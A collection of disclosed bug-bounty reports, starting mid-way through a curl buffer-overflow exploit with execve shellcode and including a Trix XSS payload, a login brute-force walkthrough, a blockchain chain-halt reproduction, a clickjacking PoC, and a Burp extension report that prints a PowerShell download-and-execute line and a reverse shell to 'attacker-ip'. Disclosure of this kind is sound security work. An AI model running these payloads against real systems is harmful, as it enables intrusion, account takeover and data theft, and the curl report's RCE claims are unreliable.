    printf("[EXPLOIT] Executing strcpy(fname, env)...\n");
    strcpy(fname, malicious_env);
    
    printf("[EXPLOIT] Copied %zu bytes into buffer\n", strlen(fname));
    printf("[EXPLOIT] Memory corruption potential: HIGH\n");
    
    free(malicious_env);
}

// Advanced exploit with shellcode potential
void advanced_exploit() {
    printf("\n[ADVANCED EXPLOIT] Testing RCE potential...\n");
    
    // Crafted payload with NOP sled and shellcode
    char payload[600];
    
    // NOP sled
    memset(payload, 0x90, 200);
    
    // Shellcode placeholder (execve /bin/sh)
    char shellcode[] = 
        "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50"
        "\x53\x89\xe1\xb0\x0b\xcd\x80";
    
    // Copy shellcode
    memcpy(payload + 200, shellcode, sizeof(shellcode)-1);
    
    // Fill rest with return address guesses
    memset(payload + 200 + sizeof(shellcode)-1, 0x41, 600-200-sizeof(shellcode)+1);
    
    printf("[ADVANCED EXPLOIT] Crafted payload with shellcode\n");
    printf("[ADVANCED EXPLOIT] Potential for arbitrary code execution\n");
}

int main() {
    printf("=== CURL MEMORY DEBUG EXPLOIT DEMONSTRATION ===\n");
    
    // Basic exploit
    exploit_memory_tracking();
    
    // Advanced exploit
    advanced_exploit();
    
    printf("\n[REAL-WORLD EXPLOIT COMMAND]:\n");
    printf("export CURL_MEMDEBUG=$(python -c \"print 'A'*600\")\n");
    printf("curl http://example.com\n");
    
    return 0;
}
```

Compile and Test Exploit
```
# Compile the exploit
gcc -o curl_exploit curl_exploit.c

# Run exploitation demonstration
./curl_exploit

# Expected output:
# [EXPLOIT] Creating 600-byte malicious input
# [EXPLOIT] Buffer size: 512 bytes
# [EXPLOIT] Input truncated to 511 bytes
# [EXPLOIT] Executing strcpy(fname, env)...
# [EXPLOIT] Memory corruption potential: HIGH
```

Real-World Attack Vectors
```
# 1. Simple DoS Attack
export CURL_MEMDEBUG=$(python -c "print 'A'*1000")
curl https://example.com
# Result: Segmentation fault during initialization

# 2. Memory Corruption Attack  
export CURL_MEMDEBUG=$(python -c "print '\x90'*500 + 'SHELLCODE'")
curl https://example.com
# Result: Potential code execution

# 3. Information Disclosure
export CURL_MEMDEBUG=$(python -c "print 'A'*511 + 'SECRET'")
curl https://example.com
# Result: Stack memory leakage
```

What Hackers Can Achieve
Remote Code Execution - Execute arbitrary code during curl startup

Privilege Escalation - Gain elevated privileges on system

Denial of Service - Crash curl instantly on startup

Information Theft - Leak sensitive memory contents

Persistence - Install backdoors or malware

Recommendation
Immediate Fix
Replace vulnerable strcpy() with secure alternative:
```
// FIXED VERSION:
static void memory_tracking_init(void)
{
  char *env;
  env = curl_getenv("CURL_MEMDEBUG");
  if(env) {
    char fname[512];
    // SECURE: Use strncpy with bounds checking
    strncpy(fname, env, sizeof(fname)-1);
    fname[sizeof(fname)-1] = '\0';  // Ensure null termination
    curl_free(env);
    curl_dbg_memdebug(fname);
  }
}
```

Alternative Secure Solutions
```
// Option 1: snprintf (Most Secure)
snprintf(fname, sizeof(fname), "%s", env);

// Option 2: memcpy with explicit bounds
size_t copy_len = strlen(env);
if(copy_len >= sizeof(fname))
    copy_len = sizeof(fname)-1;
memcpy(fname, env, copy_len);
fname[copy_len] = '\0';

// Option 3: curl's own safe functions
// Use existing curl safe string functions if available
```

Security Best Practices Implementation
Eliminate strcpy() from entire codebase

Input Validation - validate environment variable content

Dynamic Allocation - allocate buffer based on input size

Security Review - audit all environment variable usage

Why This is CRITICAL
Security Standards Violation
CWE-676: Use of Potentially Dangerous Function

CERT C STR07-C: Use the bounds-checking interfaces

MISRA C: strcpy() is explicitly banned

OWASP: Unsafe function usage

Real-World Impact
Attack Vector: Environment variables are common exploitation targets

Initialization Code: Vulnerabilities during startup are particularly dangerous

Memory Debugging: Security-critical feature should be secure by design

This vulnerability represents a HIGH severity security risk that should be addressed immediately in the next curl security release. The combination of user-controlled input, deprecated unsafe function, and initialization code context creates a serious security threat.

---

### [Mutation Based Stored XSS on Trix Editor version latest (2.1.8)](https://hackerone.com/reports/2819573)

- **Report ID:** `2819573`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** Basecamp
- **Reporter:** @sudi
- **Bounty:** - usd
- **Disclosed:** 2025-06-27T12:55:01.486Z
- **CVE(s):** -

**Vulnerability Information:**

Heyy there,
I have found a bypass for the sanitizer used in Trix Editor https://github.com/basecamp/trix , the bypass is kind a  of mutation based , using copy paste vector it's possible to perform the xss.

An example payload would be:

```html
copy<div data-trix-attachment="{&quot;contentType&quot;:&quot;text/html5&quot;,&quot;content&quot;:&quot;&lt;math&gt;&lt;mtext&gt;&lt;table&gt;&lt;mglyph&gt;&lt;style&gt;&lt;img src=x onerror=alert()&gt;&lt;/style&gt;XSS POC&quot;}"></div>me
```

Decoding the html entity you get the below payload ,which contains the mutation xss vector
```html
<math><mtext><table><mglyph><style><img src=x onerror=alert()></style>
```

For more details on this bypass you can read here: https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/
There will exist will more simple vectors this is just an example which worked out of the blue.

-------------------------------------------------

**Steps to reproduce:**

Using the similar poc from the report #2521419 we can replicate the bug, just save the below code in .html file and then copy the text saying `copy me` and paste it in the editor this will popup an alert.

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Trix Editor XSS Demo</title>
  <script src="https://cdn.jsdelivr.net/npm/trix@2.1.8/dist/trix.umd.js"></script>
  <link href="https://cdn.jsdelivr.net/npm/trix@2.1.1/dist/trix.min.css" rel="stylesheet">
</head>
<body>
  <h1>Trix Editor XSS Demo</h1>
  <trix-editor></trix-editor>
  <script>
  document.write(`copy<div data-trix-attachment="{&quot;contentType&quot;:&quot;text/html5&quot;,&quot;content&quot;:&quot;&lt;math&gt;&lt;mtext&gt;&lt;table&gt;&lt;mglyph&gt;&lt;style&gt;&lt;img src=x onerror=alert()&gt;&lt;/style&gt;XSS POC&quot;}"></div>me`);
  </script>
</body>
</html>

```

{F3733124}

## Impact

An attacker could exploit these vulnerabilities to execute arbitrary JavaScript code within the context of the user's session, potentially leading to unauthorized actions being performed or sensitive information being disclosed.

---

### [Missing ^ Line Beginner Leads to Origin Spoofing](https://hackerone.com/reports/2818009)

- **Report ID:** `2818009`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** MetaMask
- **Reporter:** @pkkr
- **Bounty:** - usd
- **Disclosed:** 2025-05-20T16:46:42.962Z
- **CVE(s):** -

**Summary (team):**

@pkkr identified a vulnerability in MetaMask’s regex-based origin validation for endowments. Due to a missing caret (^) anchor at the beginning of the regex pattern in the createOriginRegExp function, origin spoofing was possible. This oversight allowed malicious domains like maliciousmetamask.io to be treated as trusted if the intended rule was to trust metamask.io.
This issue could have led to unauthorized interactions with trusted Snaps, bypassing intended security restrictions. We appreciate @pkkr for identifying this flaw and helping us improve MetaMask’s security.

---

### [Weak Rate Limiting Controls in the (LOGIN) page Expose System to Brute Force and DoS Attacks](https://hackerone.com/reports/3085889)

- **Report ID:** `3085889`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** Lichess
- **Reporter:** @hajjaj0x
- **Bounty:** - usd
- **Disclosed:** 2025-05-15T11:11:04.687Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:

The login page lacks proper rate limiting, allowing an attacker to easily perform a brute-force attack. This vulnerability enables the attacker to systematically try different username and password combinations until they successfully compromise any account, which poses a significant security risk.

## Steps To Reproduce:

1.    Navigate to the login page.

2. Attempt login with any valid credentials.

 3.  Capture the request using a proxy tool (e.g., Burp Suite).

  +  Modify the captured request by deleting the token parameter and the cookies to make the request look like this:
====================================================================
POST /login HTTP/2
Host: lichess.org
Content-Length: 343
Cache-Control: max-age=0
Sec-Ch-Ua-Platform: "Linux"
X-Requested-With: XMLHttpRequest
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Not?A_Brand";v="99", "Chromium";v="130"
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryc5GZocBapliqt011
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: */*
Origin: https://lichess.org
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://lichess.org/login
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

------WebKitFormBoundaryc5GZocBapliqt011
Content-Disposition: form-data; name="username"

§username§
------WebKitFormBoundaryc5GZocBapliqt011
Content-Disposition: form-data; name="password"

§password§
------WebKitFormBoundaryc5GZocBapliqt011
Content-Disposition: form-data; name="remember"

true
------WebKitFormBoundaryc5GZocBapliqt011-- 
=================================================================================

5.    Send the request to Burp's Intruder, adding a username wordlist for the "username" field and a password wordlist for the "password" field. Run the attack with the cluster bomb payload type.

    +   The wordlists should be large and realistic, matching common usernames and passwords (this will prevent rate-limiting issues caused by a smaller wordlist).

       + A smaller wordlist will cause the app to respond with 429 Too Many Requests due to insufficient time between attempts.

6.    Launch the attack, and you should eventually find a valid pair of credentials (response code 200 OK).

      + Ensure auto encoding is turned off in Burp Suite, as the credentials in the request are in plaintext.

     +   Note: The valid username will match many incorrect password attempts before the correct password is found and the app will not even feel that or make any reaction

Cause of the Vulnerability:

The vulnerability exists because the rate-limiting mechanism only checks for excessive requests to individual usernames. It does not account for multiple requests being sent to different usernames, allowing an attacker to bypass the rate-limiting by targeting a range of usernames. This creates an opportunity for a brute-force attack across a large set of accounts.

## Supporting Material/References:
{F4234333}
{F4234390}
{F4234544}

  * [attachment / reference]

## Impact

This vulnerability can lead to account takeover, privilege escalation, and the theft of sensitive user data.

---

### [Groups module can halt chain when handling a proposal with malicious group weights ](https://hackerone.com/reports/3018307)

- **Report ID:** `3018307`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Cosmos
- **Reporter:** @vakzz
- **Bounty:** 15000 usd
- **Disclosed:** 2025-04-23T23:00:29.126Z
- **CVE(s):** -

**Vulnerability Information:**

### Summary of Impact

After having a look into the patch for https://github.com/cosmos/cosmos-sdk/security/advisories/GHSA-x5vx-95h7-rv4p I discovered a very similar bug.

The original error was due to a divide by zero at https://github.com/cosmos/cosmos-sdk/blob/v0.50.12/x/group/types.go#L215 when the total power was zero.

```go
yesPercentage, err := yesCount.Quo(totalPowerDec)
```

The patch prevented groups from having zero power and also added a guard to the division:
```go
if totalPowerDec.IsZero() {
        return DecisionPolicyResult{Allow: false, Final: true}, nil
}
yesPercentage, err := yesCount.Quo(totalPowerDec)
```

The issue is that there are other ways that `Quo` can fail, such as if the exponent of the resulting value is out of range:
https://github.com/cockroachdb/apd/blob/master/decimal.go#L293-L309
```golang
// setExponent sets d's Exponent to the sum of xs. Each value and the sum
// of xs must fit within an int32. An error occurs if the sum is outside of
// the MaxExponent or MinExponent range. res is any Condition previously set
// for this operation, which can cause Underflow to be set if, for example,
// Inexact is already set.
func (d *Decimal) setExponent(c *Context, res Condition, xs ...int64) Condition {
    var sum int64
    for _, x := range xs {
        if x > MaxExponent {
            return SystemOverflow | Overflow
        }
        if x < MinExponent {
            return SystemUnderflow | Underflow
        }
        sum += x
    }
    r := int32(sum)
```

Since there are no limits on group member weight, it's possible to trigger this failure by having two members with weights of `"1e-50000"` and `"1e50000"`. If the user with the tiny weight votes yes, `yesCount.Quo(totalPowerDec)` will return an error `decimal quotient error: exponent out of range` and cause a chain halt when `doTallyAndUpdate` is called from the EndBlocker.

### Steps to Reproduce
Create a new chain with ignite:
```bash
ignite scaffold chain example
cd example
ignite chain serve

#  Cosmos SDK's version is: v0.50.12
```

Create the following two json files using the addressed created by ignite server:

members.json
```json
{
    "members": [
        {
            "address": "cosmos14xzyhnr8w098awcf8l6t57qw3qlhcwsntytvm0",
            "weight": "1e-50000"
        },
        {
            "address": "cosmos18v59wacnwz89qphdez62m6nn7qse8mgfr7m0lk",
            "weight": "1e50000"
        }
    ]
}
```

policy.json
```json
{
    "@type": "/cosmos.group.v1.PercentageDecisionPolicy",
    "percentage": "0.5",
    "windows": {
        "voting_period": "10s",
        "min_execution_period": "20s"
    }
}
```

Create the group and transfer some funds to the policy address for testing:

```bash
exampled tx group create-group-with-policy cosmos14xzyhnr8w098awcf8l6t57qw3qlhcwsntytvm0 "" "" members.json policy.json --gas auto --yes
exampled q group group-policies-by-admin cosmos14xzyhnr8w098awcf8l6t57qw3qlhcwsntytvm0
exampled tx bank send cosmos14xzyhnr8w098awcf8l6t57qw3qlhcwsntytvm0 cosmos17pmq7hp4upvmmveqexzuhzu64v36re3w3447n7dt46uwp594wtpsqv4fn5 100stake --gas auto --yes
```

Create a new proposal file:

proposal.json
```
{
    "group_policy_address": "cosmos17pmq7hp4upvmmveqexzuhzu64v36re3w3447n7dt46uwp594wtpsqv4fn5",
    "messages": [
        {
            "@type": "/cosmos.bank.v1beta1.MsgSend",
            "from_address": "cosmos17pmq7hp4upvmmveqexzuhzu64v36re3w3447n7dt46uwp594wtpsqv4fn5",
            "to_address": "cosmos14xzyhnr8w098awcf8l6t57qw3qlhcwsntytvm0",
            "amount": [
                {
                    "denom": "stake",
                    "amount": "10"
                }
            ]
        }
    ],
    "metadata": "",
    "title": "crash",
    "summary": "crash",
    "proposers": [
        "cosmos14xzyhnr8w098awcf8l6t57qw3qlhcwsntytvm0"
    ]
}
```

Submit and vote for the proposal
```
exampled tx group submit-proposal proposal.json --gas auto --yes
exampled tx group vote 1 cosmos14xzyhnr8w098awcf8l6t57qw3qlhcwsntytvm0 VOTE_OPTION_YES "" --gas auto --yes
```

Chain halts:
```
[EXAMPLED] 11:20PM ERR error in proxyAppConn.FinalizeBlock err="doTallyAndUpdate: policy allow: decimal quotient error: exponent out of range" module=state
[EXAMPLED] 11:20PM ERR CONSENSUS FAILURE!!! err="failed to apply block; error doTallyAndUpdate: policy allow: decimal quotient error: exponent out of range [cockroachdb/apd/v2@v2.0.2/condition.go:107]" module=consensus stack="goroutine 80 [running]:\nruntime/debug.Stack()\n\t/opt/homebrew/Cellar/go/1.23.2/libexec/src/runtime/debug/stack.go:26 +0x64\ngithub.com/cometbft/cometbft/consensus.(*State).receiveRoutine.func2()\n\t/Users/will/go/pkg/mod/github.com/cometbft/cometbft@v0.38.17/consensus/state.go:801 +0x4c\npanic({0x109639ae0?, 0x14001246280?})\n\t/opt/homebrew/Cellar/go/1.23.2/libexec/src/runtime/panic.go:785 +0xf0\ngithub.com/cometbft/cometbft/consensus.(*State).finalizeCommit(0x14001751c08, 0x5c6)\n\t/Users/will/go/pkg/mod/github.com/cometbft/cometbft@v0.38.17/consensus/state.go:1781 +0x1030\ngithub.com/cometbft/cometbft/consensus.(*State).tryFinalizeCommit(0x14001751c08, 0x5c6)\n\t/Users/will/go/pkg/mod/github.com/cometbft/cometbft@v0.38.17/consensus/state.go:1682 +0x2c0\ngithub.com/cometbft/cometbft/consensus.(*State).enterCommit.func1()\n\t/Users/will/go/pkg/mod/github.com/cometbft/cometbft@v0.38.17/consensus/state.go:1617 +0xb8\ngithub.com/cometbft/cometbft/consensus.(*State).enterCommit(0x14001751c08, 0x5c6, 0x0)\n\t/Users/will/go/pkg/mod/github.com/cometbft/cometbft@v0.38.17/consensus/state.go:1655 +0xd90\ngithub.com/cometbft/cometbft/consensus.(*State).addVote(0x14001751c08, 0x14002549040, {0x0, 0x0})\n\t/Users/will/go/pkg/mod/github.com/cometbft/cometbft@v0.38.17/consensus/state.go:2343 +0x2a58\ngithub.com/cometbft/cometbft/consensus.(*State).tryAddVote(0x14001751c08, 0x14002549040, {0x0, 0x0})\n\t/Users/will/go/pkg/mod/github.com/cometbft/cometbft@v0.38.17/consensus/state.go:2067 +0x50\ngithub.com/cometbft/cometbft/consensus.(*State).handleMsg(0x14001751c08, {{0x109ca2080, 0x140017185d0}, {0x0, 0x0}})\n\t/Users/will/go/pkg/mod/github.com/cometbft/cometbft@v0.38.17/consensus/state.go:929 +0x5c0\ngithub.com/cometbft/cometbft/consensus.(*State).receiveRoutine(0x14001751c08, 0x0)\n\t/Users/will/go/pkg/mod/github.com/cometbft/cometbft@v0.38.17/consensus/state.go:856 +0x5fc\ncreated by github.com/cometbft/cometbft/consensus.(*State).OnStart in goroutine 1\n\t/Users/will/go/pkg/mod/github.com/cometbft/cometbft@v0.38.17/consensus/state.go:398 +0x1e4\n"
[EXAMPLED] 11:20PM INF service stop impl=baseWAL module=consensus msg="Stopping baseWAL service" wal=/Users/will/.example/data/cs.wal/wal
[EXAMPLED] 11:20PM INF service stop impl=Group module=consensus msg="Stopping Group service" wal=/Users/will/.example/data/cs.wal/wal
[EXAMPLED] 11:20PM INF Timed out dur=1000 height=1478 module=consensus round=0 step=RoundStepPropose
```

### Workarounds
I think a patch/update will need to be applied to fix the issue.

### Supporting Material/References
Criticality: High (Considerable Impact; Likely Likelihood per [ACMv1.2](https://github.com/interchainio/security/blob/main/resources/CLASSIFICATION_MATRIX.md))
Affected users: Validators, Full nodes, Users on chains that utilize the groups module

## Impact

A malicious user that can interact with the groups module can cause the entire chain to halt. Any chain that utilizes the groups module is affected.

---

### [low-level p2p ping + tcp flooding leads to a remote crash in monerod](https://hackerone.com/reports/2858802)

- **Report ID:** `2858802`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** Monero
- **Reporter:** @padillac
- **Bounty:** - usd
- **Disclosed:** 2025-04-14T17:58:40.866Z
- **CVE(s):** -

**Summary (team):**

P2P daemon remote crash exploit that could have been scaled up to attack the whole network.

**Summary (researcher):**

total network shutdown
https://x.com/123456

---

### [Direct IP Access to Website](https://hackerone.com/reports/3068485)

- **Report ID:** `3068485`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** Lichess
- **Reporter:** @ryomenshuvro
- **Bounty:** - usd
- **Disclosed:** 2025-04-11T08:54:33.545Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
The website is accessible directly via its IP address (37.187.205.99), which may bypass domain-based security policies and expose potential misconfigurations.

## Steps To Reproduce:
1. Open a web browser and enter the IP address:
http://37.187.205.99
2. Observe that it loads the main website instead of rejecting the request or redirecting it to the proper domain.

##Expected Result:
The server should block direct IP access or redirect it to the proper domain.

##Actual Result:
The website is fully accessible via its IP address.

## Impact

1. Domain-based security policies (CSP, HSTS, cookies, etc.) might not be enforced, leading to potential security bypasses.

2. Possible certificate mismatch issues if HTTPS is used, making it easier for phishing attacks.

3. Firewall/hosting misconfigurations could expose internal infrastructure.

---

### [Broken Access Control leads to disclosure of transaction history via /v2/rechargeTransactionHistory endpoint](https://hackerone.com/reports/2746709)

- **Report ID:** `2746709`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** MTN Group
- **Reporter:** @hafiz-ng
- **Bounty:** - usd
- **Disclosed:** 2025-03-02T14:56:10.848Z
- **CVE(s):** -

**Vulnerability Information:**

An API endpoint discovered on the MyMTN NG mobile app fails to adequately enforce authorization and authentication mechanisms. Essentially, it allows a bad actor to access the transaction history details for other victims which include `rechargeDate`,  `amountAfter`,  `amountBefore` and `transactionId` due to an insufficient authorization check. 

## Steps To Reproduce:
  1. Log into the **myMTN NG** mobile app.
  2. Set up your proxy tool to intercept the mobile API traffic and bypass the SSL pinning mechanism.
  3. Visit the **transaction history** section within the app and intercept the request with your proxy tool.
 4. Replace the `customer_id` field to any arbitrary MTN number to disclose transaction details of the victim.

## Supporting Material/References:
{█████████}

**Request to vulnerable endpoint**
```POST /api/v2/rechargeTransactionHistory HTTP/2
Host: ████████
Content-Type: application/json
Access-Control-Allow-Origin: *
Accept: application/json
Authorization: ██████
X-Country-Code: nga
Msisdn-Code: 234
Accept-Encoding: gzip, deflate, br
Accept-Language: en-us
Content-Length: 77
User-Agent: myMTN%20NG/14 CFNetwork/1220.1 Darwin/20.3.0

{"customer_id":"2347032233323","start_date":"██████████","end_date":"█████████"}
```

**Response**
```
{"sequenceNumber":"b5fb6af-bc59-57dd-a","data":[{"rechargeDate":"████","amountAfter":"878190.940000","adjustmentType":"RECHARGE","amountBefore":"828190.940000","subscriberId":"2347032233323","rechargeHistory":[{"payType":"VTU","rechargeAmount":"50000.0","description":"VTU"}],"transaction":"VTU"},{"rechargeDate":"███████","amountAfter":"828190.940000","adjustmentType":"RECHARGE","amountBefore":"778190.940000","subscriberId":"2347032233323","rechargeHistory":[{"payType":"VTU","rechargeAmount":"50000.0","description":"VTU"}],"transaction":"VTU"}],"transaction":"VTU"}],"success":true,"resultCode":"0000","links":[],"resultDescription":"Success","transactionId":"████████141033000481","status":200,"statusCode":200}```

## Impact

The potential impact this vulnerability may have on MTN NG can be summarized as follows:

- The impact of this exposure of PII can be devastating to your company, with fallout ranging from recovery costs to decreased customer trust. 
-  Attackers with access to this private information about a victim can use this information to carryout other nefarious activities.

---

### [Burp Suite extensions can execute arbitrary code](https://hackerone.com/reports/3014158)

- **Report ID:** `3014158`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** PortSwigger Web Security
- **Reporter:** @iamunixtz
- **Bounty:** - usd
- **Disclosed:** 2025-02-26T13:52:23.646Z
- **CVE(s):** -

**Vulnerability Information:**

**Dear PortSwigger Security Team,**

I hope you’re doing well. I’m reaching out to share a security concern regarding Burp Suite’s extension framework that could allow an attacker to compromise a machine by executing untrusted code. While Burp Suite offers powerful extensibility, this flexibility can also introduce significant security risks if an attacker crafts a malicious extension. This research highlights a attack vector that allows code execution, leading to full system compromise, including reverse shells and persistent access.

## **Overview of the Issue**
Burp Suite extensions, when installed and executed, run with the same privileges as the user. This means that an attacker can embed arbitrary system commands inside an extension that, when loaded, will execute malicious payloads. This could include actions such as:
- Running a reverse shell to an attacker-controlled machine.
- Downloading and executing remote payloads.
- Capturing keystrokes, screenshots, and other sensitive data.
- Bypassing security measures by running malicious actions in the background.

For this demonstration, I will showcase how an attacker can embed seemingly harmless functionality inside a Burp extension while covertly executing malicious actions in the background.


## **Demonstration of the Attack**
To illustrate this, I created a Burp extension that appears to perform simple tasks such as opening Notepad and Calculator. However, in reality, it also performs the following malicious actions:
1. **Creates a hidden PowerShell script** (`poc.ps1`).
2. **Executes the PowerShell script**, which opens a reverse shell to an attacker’s machine.
3. **Opens a backdoor using `nc` (Netcat)** to maintain persistent access.
4. **Runs system-level commands**, such as accessing the webcam, stealing credentials, or modifying system settings.

### **Code Breakdown**
Below is a breakdown of the extension’s malicious functionality:

1. **Executing Arbitrary System Commands (e.g., Calculator, Notepad, Webcam)**
   ```python
   subprocess.Popen(["calc.exe"], shell=True)  # Opens Calculator
   subprocess.Popen(["notepad.exe", "poc.txt"], shell=True)  # Opens Notepad with a file
   subprocess.Popen(["start", "microsoft.windows.camera:"], shell=True)  # Opens Camera
   ```
   While these actions seem harmless, they demonstrate the ability to execute system commands within an extension.

2. **Creating and Writing to a PowerShell Script**
   ```python
   file_path = os.path.join(os.getcwd(), "burpextension", "poc.ps1")
   with open(file_path, "w") as file:
       file.write("Start-Process powershell -ArgumentList '-NoP -NonI -W Hidden -Exec Bypass -C \"IEX(New-Object Net.WebClient).DownloadString(\'http://attacker-ip:8000/rev.ps1\')\"'")
   ```
   This script downloads and executes a remote PowerShell payload, providing the attacker with control over the compromised system.

3. **Executing the Malicious PowerShell Script**
   ```python
   subprocess.Popen(["powershell.exe", "-ExecutionPolicy", "Bypass", "-File", file_path], shell=True)
   ```
   This runs the PowerShell script, enabling remote access for the attacker.

4. **Establishing a Reverse Shell with Netcat**
   ```powershell
   $client = New-Object System.Net.Sockets.TCPClient("attacker-ip",4444);
   $stream = $client.GetStream();
   [byte[]]$bytes = 0..65535|%{0};
   while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
       $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
       $sendback = (iex $data 2>&1 | Out-String );
       $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
       $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
       $stream.Write($sendbyte,0,$sendbyte.Length);
       $stream.Flush()
   }
   ```
   This establishes a persistent reverse shell, allowing full system access.

**While Burp Suite does provide an extension signing feature, many users disable it or install extensions from unverified sources, making them vulnerable.**

##Full pwn Poc
{F4093216}

## **Mitigations & Recommendations**
To address this issue, I propose the following mitigations:
1. **Restrict System Commands in Extensions**
   - Prevent direct execution of `subprocess.Popen()`, `os.system()`, or PowerShell commands inside extensions.
   - Introduce an API restriction that blocks execution of commands unless explicitly allowed by the user.

2. **Extension Code Review & Sandboxing**
   - Implement a sandboxing mechanism that restricts what an extension can execute.
   - Require explicit user confirmation before an extension can execute system commands.

3. **Enforce Digital Signing for Extensions**
   - Require all extensions to be signed and verified before execution.
   - Warn users when installing unsigned extensions.

4. **Monitor and Log Extension Behavior**
   - Implement logging for all system commands executed by an extension.
   - Alert users if an extension attempts to execute unauthorized actions.

## **Conclusion**
This research demonstrates how a malicious Burp Suite extension can be used as a Trojan horse to execute arbitrary system commands, including launching a reverse shell. Given that Burp Suite is widely used by security professionals, pentesters, and even corporate environments, it is critical to enforce stricter controls on extension execution to prevent abuse.

I appreciate your time in reviewing this report, and I hope this helps improve the security of Burp Suite. Please let me know if you need further details or if I can assist with any additional testing.

Looking forward to your feedback!

## Impact

The primary issue is that Burp Suite extensions execute code with the same privileges as the user. If an attacker manages to convince a target to install a malicious extension, they can:
- Gain **persistent access** to the system.
- Execute **arbitrary system commands** in the background.
- Steal **sensitive data** without detection.
- **Bypass security measures** by executing trusted processes (e.g., PowerShell, cmd.exe, or Windows utilities).

---

### [Clickjacking in main domain https://topechelon.com/](https://hackerone.com/reports/2964441)

- **Report ID:** `2964441`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Top Echelon Software
- **Reporter:** @genz-1
- **Bounty:** - usd
- **Disclosed:** 2025-02-10T13:17:10.542Z
- **CVE(s):** -

**Vulnerability Information:**

## **Summary:**  
The target website is vulnerable to Clickjacking, a web-based attack that tricks users into interacting with a hidden or disguised iframe. Attackers can exploit this vulnerability to manipulate user actions, potentially leading to unauthorized activities such as unintended clicks, form submissions, or credential theft.  

## **Steps to Reproduce:**  
1. **Create an HTML page** embedding the target website using an `<iframe>`.  
2. **Modify CSS** to make the iframe transparent or overlay it with deceptive UI elements.  
3. **Host the HTML page** and trick users into interacting with it.  

## **Proof of Concept (PoC):**  
```html
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Clickjacking PoC</title>
<style>
    iframe {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        opacity: 0.6; /* Makes the iframe invisible */
        z-index: 99;
    }

    button {
        z-index: 100;
        top:400px;
        position: relative;
    }
    h1 {
        top: 300px;
        position: relative;

    }
</style>
</head>
<body>
<h1>Click the button for a surprise!</h1>
<button onclick="alert('Surprise!')">Click Me!</button>

<!-- Invisible iframe targeting the account deletion URL -->
<iframe id="target-frame" src="https://topechelon.com/" frameborder="0"></iframe>

<script>
    
    document.getElementById('target-frame').onload = function() {
        
        console.log('Iframe has loaded, ready for clickjacking.');
    };
</script>
</body>
</html>
```
{F4001108}

## Impact

- **User Account Takeover:** If a logged-in user interacts with the iframe, attackers could force unintended actions.  
- **Phishing Attacks:** Users may unknowingly enter sensitive credentials.  
- **Malicious Actions:** Attackers can exploit user interactions to modify settings, submit forms, or perform other unintended operations.  

## **Recommended Mitigation:**  
To prevent Clickjacking attacks, implement the following security measures:  

1. **Use the X-Frame-Options HTTP Header:**  
   - `X-Frame-Options: DENY` (Prevents embedding in iframes).  
   - `X-Frame-Options: SAMEORIGIN` (Allows iframes only from the same domain).  

2. **Use Content Security Policy (CSP) Frame-Ancestors Directive:**  
   - `Content-Security-Policy: frame-ancestors 'self'`  

3. **JavaScript-Based Frame Busting (as an additional security measure):**  
   ```javascript
   if (window.top !== window.self) {
       window.top.location = window.self.location;
   }

---

### [Weak credentials found in Jenkins endpoint](https://hackerone.com/reports/2954547)

- **Report ID:** `2954547`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** IBM
- **Reporter:** @roswell-47
- **Bounty:** - usd
- **Disclosed:** 2025-02-05T15:48:53.791Z
- **CVE(s):** -

**Summary (team):**

Weak credentials found in Jenkins endpoint was reported to IBM, analyzed and have been remediated. Thank you to our external researcher @sweetheart1337_.

---

### [Disclosing  PolicyPageAssetGroup in Private Programs via /graphql `gid://hackerone/PolicyPageAssetGroupsIndex::PolicyPageAssetGroup/{id}`](https://hackerone.com/reports/1618347)

- **Report ID:** `1618347`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** HackerOne
- **Reporter:** @haxta4ok00
- **Bounty:** 25000 usd
- **Disclosed:** 2025-01-21T17:52:54.155Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
Hi team, I understand what's going on
**Description:**
Just a recent update gives the results of private programs
### Steps To Reproduce

Without authorization

GraphQL: 
`{"query":"{node(id:\"gid://hackerone/PolicyPageAssetGroupsIndex::PolicyPageAssetGroup/3981-41287\"){... on PolicyPageAssetGroupDocument{id,name}}}"}`

Answer:
`{"data":{"node":{"id":"Z2lkOi8vaGFja2Vyb25lL1BvbGljeVBhZ2VBc3NldEdyb3Vwc0luZGV4OjpQb2xpY3lQYWdlQXNzZXRHcm91cC8zOTgxLTQxMjg3","name":"██████"}}}`

This is Asset program - █████████

Thanks!

## Impact

Disclosing Sсope(Assets) in Private Programs

**Summary (researcher):**

This vulnerability allowed unauthorized users to retrieve sensitive information about private bug bounty programs on HackerOne and the titles of private reports by abusing a GraphQL endpoint.
Attackers could enumerate {id} values and expose private data, including program names, scope details, and the titles of reports belonging to those programs.

